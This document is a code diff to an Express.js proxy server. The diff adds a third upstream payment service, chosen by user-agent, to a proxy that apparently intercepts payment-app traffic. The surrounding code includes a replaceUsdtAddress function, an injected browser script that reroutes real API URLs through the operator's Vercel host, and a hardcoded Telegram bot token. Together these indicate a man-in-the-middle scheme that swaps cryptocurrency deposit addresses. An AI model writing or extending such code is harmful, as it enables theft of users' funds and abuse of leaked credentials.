@@ -6,6 +6,8 @@ const app = express();
 const TIVOX_API = 'https://tivox.icu';
 const REAL_API = 'https://qonix.click';
 const PROXY_HOST = 'rtyhh.vercel.app';
+const TIVRA_API = 'https://nu4btuu4sd.com';
+const TIVRA_HOST = 'nu4btuu4sd.com';
 const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -348,6 +350,12 @@ function replaceUsdtAddress(obj, newAddr, depth) {
     }
   }
 }
+
+app.use((req, res, next) => {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  req.pxTarget = ua.includes('tivrapay') ? 'tivra' : 'tivox';
+  next();
+});
 
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
@@ -762,14 +770,17 @@ Example:
 
 async function proxyToTivox(req) {
   const path = req.originalUrl || req.url;
-  const url = TIVOX_API + path;
+  const isTivra = req.pxTarget === 'tivra';
+  const baseUrl = isTivra ? TIVRA_API : TIVOX_API;
+  const targetHost = isTivra ? TIVRA_HOST : 'tivox.icu';
+  const url = baseUrl + path;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
     if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'tivox.icu';
+  fwd['host'] = targetHost;
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -1240,7 +1251,8 @@ if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
-function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
+var REAL3='https://nu4btuu4sd.com';
+function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);if(u.indexOf(REAL3)===0)return P+u.slice(REAL3.length);return null;}
 var CFG=null;
 var UID='';
 
